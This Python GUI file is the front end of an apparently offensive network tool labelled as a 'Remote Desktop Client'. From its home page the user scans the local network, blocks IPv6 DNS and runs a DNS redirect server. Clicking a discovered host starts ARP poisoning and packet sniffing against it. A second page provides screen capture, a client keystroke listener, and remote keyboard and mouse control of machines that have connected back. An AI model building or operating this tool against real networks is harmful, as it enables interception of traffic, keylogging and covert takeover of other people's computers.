import customtkinter
import threading
from Arp_Dns_Sp import ARPPoison
from DnsRedirectServer import RedirectServer
from AdminNetwork import RemoteDesktopClient
from Myprotocol import Myprotocol
from ScreenShareFrame import ScreenDisplay
from ClientKeysFrame import KeysFrame
from ControlKeyboard import KeyboardSendFrame

class mainGui(customtkinter.CTk):
    def __init__(self):
        super().__init__()
        self.title("Remote Desktop Client")
        self.geometry("1300x750")

        self.grid_rowconfigure(0, weight=1)  # Allow row 0 to expand
        self.grid_columnconfigure(0, weight=1)
        self.frames = {}  # Dictionary to store frames

        self.protocol = Myprotocol()
        self.user = RemoteDesktopClient(ip="127.0.0.1", port=7000,frames=self.frames)

        self.create_pages()

    def create_pages(self):
        # Initialize and pack frames
        for PageClass in (HomePage, ConnectTarget):
            frame = PageClass(self)
            self.frames[PageClass.__name__] = frame
            frame.grid(row=0, column=0, sticky="nsew")

        self.show_page(HomePage)

    def show_page(self, page_class):
        # Bring the specified frame to the front
        frame = self.frames[page_class.__name__]
        frame.tkraise()

class HomePage(customtkinter.CTkFrame):
    def __init__(self,master : mainGui):
        super().__init__(master)
        self.master = master

        self.label_title = customtkinter.CTkLabel(self, text="Remote Scanning App", font=("Arial", 24))
        self.label_title.grid(row=0, column=1, padx=0, pady=20)

        self.buttons_entits = []

        self.arp = ARPPoison()
        self.redirect_server = RedirectServer(host=self.arp.my_ip)
        self.redirect_server.start()

        self.create_widgets()

    def get_to_this_page(self):
        self.master.show_page(HomePage)

    def create_widgets(self):

        self.button_scan = customtkinter.CTkButton(self, text="Scan Nearby Entities", width=200, height=100, fg_color="black", command=self.start_scanning_thread)
        self.button_scan.grid(row=1, column=0, padx=20, pady=20)
        # Create a canvas for the buttons
        self.canvas = customtkinter.CTkCanvas(self, bg="white", highlightthickness=0)
        self.canvas.grid(row=2, column=0, columnspan=2, padx=20, pady=20, sticky="nsew")

        # Add a vertical scrollbar
        self.scrollbar = customtkinter.CTkScrollbar(self.canvas, orientation="vertical", command=self.canvas.yview)
        self.scrollbar.grid(row=0, column=0, sticky="ns", padx=5)

        # Configure canvas to work with the scrollbar
        self.canvas.configure(yscrollcommand=self.scrollbar.set)

        self.server_label = customtkinter.CTkLabel(self, text="entites connected to the server")
        self.server_label.grid(row=1,column=2,padx=20, pady=20)

        self.refresh_Button = customtkinter.CTkButton(self, text="Refresh Server", width=200, height=100, fg_color="black", command=self.refresh_server)
        self.refresh_Button.grid(row=1, column=3, padx=20, pady=20)

        self.server_canvas = customtkinter.CTkCanvas(self, bg="white", highlightthickness=0)
        self.server_canvas.grid(row=2, column=2, columnspan=2, padx=20, pady=20, sticky="nsew")

        self.scrollbar = customtkinter.CTkScrollbar(self.server_canvas, orientation="vertical", command=self.canvas.yview)
        self.scrollbar.grid(row=0, column=0, sticky="ns", padx=5)

        # Configure canvas to work with the scrollbar
        self.server_canvas.configure(yscrollcommand=self.scrollbar.set)


        # Configure grid stretch
        self.grid_rowconfigure(2, weight=1)
        self.grid_columnconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)
        self.grid_columnconfigure(2, weight=1)
        self.grid_columnconfigure(3, weight=1)

    def start_scanning_thread(self):
        # Start scanning in a separate thread to keep the GUI responsive
        threading.Thread(target=self.start_scanning, daemon=True).start()

    def refresh_server(self):
        self.delete_buttons_in_canvas(self.server_canvas)
        self.master.user.protocol.send_message(self.master.user.sock,"get clients")

    def start_scanning(self):
        if not self.arp:
            self.arp = ARPPoison()
        self.arp.gateway_info()
        self.arp.discover_net()
        self.arp.block_ipv6_dns()
        self.delete_buttons_in_canvas(self.canvas)

        count = 0
        for entity in self.arp.targets:
            self.after(0, self.create_entity_button, entity, count)
            count += 1

    def delete_buttons_in_canvas(self,canvas : customtkinter.CTkCanvas):
        for widget in canvas.winfo_children():
            if not isinstance(widget,customtkinter.CTkScrollbar):
                widget.destroy()

    def create_entity_button(self, entity, count):
        # Create a button for each entity directly in the canvas
        cols = 4  # 5 columns per row
        row = count // cols
        col = count % cols  # Adjust button spacing vertically

        x = col * 200 + 20  # Horizontal position (button width + spacing)
        y = row * 70 + 20

        button = customtkinter.CTkButton(
            self.canvas, text=entity[0], width=150, height=50, fg_color="blue",
            command=lambda: self.spoof_selected_target(entity, button))
        button.grid(padx=20, pady=20)
        self.canvas.create_window(x, y, anchor="nw", window=button)
        self.buttons_entits.append(button)

        # Expand the canvas scroll region
        self.canvas.configure(scrollregion=self.canvas.bbox("all"))

    def create_entity_button_server(self, entity, count):
        # Clear old buttons if needed
        try:
            # Create a button for each entity directly in the server_canvas
            cols = 4  # 4 columns per row
            row = count // cols
            col = count % cols

            x = col * 200 + 20  # Horizontal position (button width + spacing)
            y = row * 70 + 20

            def choose_client():
                self.master.user.protocol.send_message(
                    self.master.user.sock,
                    "choose client",
                    "continue",
                    entity
                )
                self.master.show_page(ConnectTarget)


            button = customtkinter.CTkButton(
                self.server_canvas,
                text=entity,
                width=150,
                height=50,
                fg_color="blue",
                command=choose_client
            )
            button.grid(padx=20, pady=20)
            self.server_canvas.create_window(x, y, anchor="nw", window=button)

            # Update the scroll region
            self.server_canvas.configure(scrollregion=self.server_canvas.bbox("all"))
        except Exception as e:
            print(f"Error creating button: {e}")

    def spoof_selected_target(self, target,button):
        if button.cget("fg_color") == "blue":
            button.configure(fg_color="red")
            # Start ARP poisoning in a separate thread
            threading.Thread(target=self.arp.poison_target, args=(target,), daemon=True).start()

            # Start sniffing in a separate thread
            threading.Thread(target=self.arp.sniff_packets, daemon=True).start()
        else:
            button.configure(fg_color="blue")
            self.arp.spoofing_active = False
            self.arp.restore_network()


    def on_closing(self):
        # Clean shutdown
        if self.arp:
            self.arp.spoofing_active = False
            self.arp.restore_network()
        if hasattr(self, 'redirect_server'):
            self.redirect_server.stop()
        self.quit()


class ConnectTarget(customtkinter.CTkFrame):
    def __init__(self, master):
        super().__init__(master, fg_color="#6495ED",border_width=1,border_color="black")
        self.root = self.master

        # Configure grid
        self.grid_rowconfigure(1, weight=0)
        self.grid_rowconfigure(2, weight=0)
        self.grid_columnconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        # Create navigation buttons frame
        self.nav_frame = customtkinter.CTkFrame(self, fg_color="#6495ED", border_width=3, border_color="#FFCC70",
                                                corner_radius=20)
        self.nav_frame.grid(row=0, column=0, columnspan=2, sticky="ew", padx=20, pady=10)
        self.nav_frame.rowconfigure(0, weight=1)

        # Create all panels immediately but start them disabled
        self.setup_navigation()
        self.create_all_panels()
        self.setup_control_switches()

    def create_all_panels(self):
        # Create screen panel (initially disabled)
        self.screen_panel = ScreenDisplay(
            self,
            self.root.user,
            width=800,
            height=600
        )
        self.screen_panel.grid(row=1, column=0, padx=20, pady=20,rowspan=2)
        self.screen_panel.disable_panel()  # Add this method to ScreenDisplay class

        # Create keys panel (initially disabled)
        self.keys_panel = KeysFrame(self, self.root.user)
        self.keys_panel.grid(row=1, column=1, padx=20)
        self.keys_panel.disable_panel()  # Add this method to KeysFrame class

        # Create keyboard control panel (initially disabled)
        self.keyboard_control_panel = KeyboardSendFrame(self, self.root.user)
        self.keyboard_control_panel.grid(row=2, column=1, padx=20)
        self.keyboard_control_panel.disable_panel()  # Add this method to KeyboardSendFrame class

        # Initialize state variables
        self.is_screen_active = customtkinter.StringVar(self, "off")
        self.is_keys_panel = customtkinter.StringVar(self, "off")
        self.is_keyboard_active = customtkinter.StringVar(self, "off")
        self.is_mouse_active = customtkinter.StringVar(self, "off")

    def setup_navigation(self):
        def handle_return_home():
            self.on_leave()
            self.root.user.return_home()
            self.root.show_page(HomePage)

        button_home = customtkinter.CTkButton(
            self.nav_frame,
            text="Back to Home",
            command=handle_return_home
        )
        button_home.grid(row=0, column=0, pady=10, padx=10, sticky="ew")

    def setup_control_switches(self):
        # Screen Share Switch
        self.screen_switch = customtkinter.CTkSwitch(
            self.nav_frame,
            text="Screen Share",
            variable=self.is_screen_active,
            command=self.toggle_screen_share,
            onvalue="on", offvalue="off",
            text_color="white"
        )
        self.screen_switch.grid(row=0, column=1, pady=10, padx=10, sticky="ew")

        # Keys Listener Switch
        self.keys_switch = customtkinter.CTkSwitch(
            self.nav_frame,
            text="Client Keys Listener",
            variable=self.is_keys_panel,
            command=self.toggle_keys_listener,
            onvalue="on", offvalue="off",
            text_color="white"
        )
        self.keys_switch.grid(row=0, column=4, pady=10, padx=10, sticky="ew")

        # Keyboard Control Switch
        self.keyboard_switch = customtkinter.CTkSwitch(
            self.nav_frame,
            text="Keyboard Control",
            variable=self.is_keyboard_active,
            command=self.toggle_keyboard_control,
            onvalue="on", offvalue="off",
            text_color="white"
        )
        self.keyboard_switch.grid(row=0, column=3, pady=10, padx=10, sticky="ew")

        # Mouse Control Switch
        self.mouse_switch = customtkinter.CTkSwitch(
            self.nav_frame,
            text="Mouse Control",
            variable=self.is_mouse_active,
            command=self.toggle_mouse_control,
            onvalue="on", offvalue="off",
            text_color="white"
        )
        self.mouse_switch.grid(row=0, column=2, pady=10, padx=10, sticky="ew")

        for i in range(5):
            self.nav_frame.grid_columnconfigure(i, weight=1)

    def toggle_screen_share(self):
        if self.is_screen_active.get() == "on":
            self.start_screen_share()
        else:
            self.stop_screen_share()

    def toggle_keys_listener(self):
        if self.is_keys_panel.get() == "on":
            self.start_keys_panel()
        else:
            self.stop_keys_panel()

    def toggle_keyboard_control(self):
        if self.is_keyboard_active.get() == "on":
            self.start_keyboard_control()
        else:
            self.stop_keyboard_control()

    def toggle_mouse_control(self):
        if self.is_mouse_active.get() == "on":
            if self.is_screen_active.get() == "off":
                self.show_error_message("Must start screen first")
                self.is_mouse_active.set("off")
                return
            self.start_mouse_control()
        else:
            self.stop_mouse_control()

    def start_screen_share(self):
        self.root.user.start_screen_capture()
        self.screen_panel.enable_panel()  # Add this method to ScreenDisplay class

    def stop_screen_share(self):
        self.root.user.stop_screen_capture()
        self.screen_panel.disable_panel()

        if self.is_mouse_active.get() == "on":
            self.stop_mouse_control()
            self.is_mouse_active.set("off")
            self.mouse_switch.update()

    def start_keys_panel(self):
        self.root.user.start_client_keys_listener()
        self.keys_panel.enable_panel()

    def stop_keys_panel(self):
        self.root.user.stop_client_keys_listener()
        self.keys_panel.disable_panel()

    def start_keyboard_control(self):
        self.root.user.start_keyboard_control()
        self.keyboard_control_panel.enable_panel()

    def stop_keyboard_control(self):
        self.root.user.stop_keyboard_control()
        self.keyboard_control_panel.disable_panel()

    def start_mouse_control(self):
        self.screen_panel.canvas.bind("<Motion>", self.show_mouse_position)
        self.screen_panel.canvas.bind("<Button>", self.root.user.send_mouse_clicks)
        self.root.user.start_mouse_control()

    def stop_mouse_control(self):
        self.root.user.stop_mouse_control()
        self.screen_panel.canvas.unbind("<Motion>")
        self.screen_panel.canvas.unbind("<Button>")

    def show_mouse_position(self, event):
        x, y = event.x, event.y
        x_client = x * (self.screen_panel.screen_width / self.screen_panel.frame_width)
        y_client = y * (self.screen_panel.screen_height / self.screen_panel.frame_height)
        self.root.user.send_mouse_pos((x_client, y_client))

    def show_error_message(self, message):
        top = customtkinter.CTkToplevel()
        top.geometry("250x150")
        top.title("Error")
        top.transient(master=self.root)
        top.grab_set()
        top.focus_set()

        label = customtkinter.CTkLabel(top, text=message)
        label.grid(row=0, column=0, pady=20, padx=50)

        button = customtkinter.CTkButton(top, text="Okay", command=top.destroy)
        button.grid(row=1, column=0, pady=20, padx=50)

    def on_leave(self):
        """Called when leaving this frame"""
        if self.is_screen_active.get() == "on":
            self.stop_screen_share()
        if self.is_keyboard_active.get() == "on":
            self.stop_keyboard_control()
        if self.is_mouse_active.get() == "on":
            self.stop_mouse_control()
        if self.is_keys_panel.get() == "on":
            self.stop_keys_panel()

if __name__ == "__main__":
    app = mainGui()
    app.mainloop()
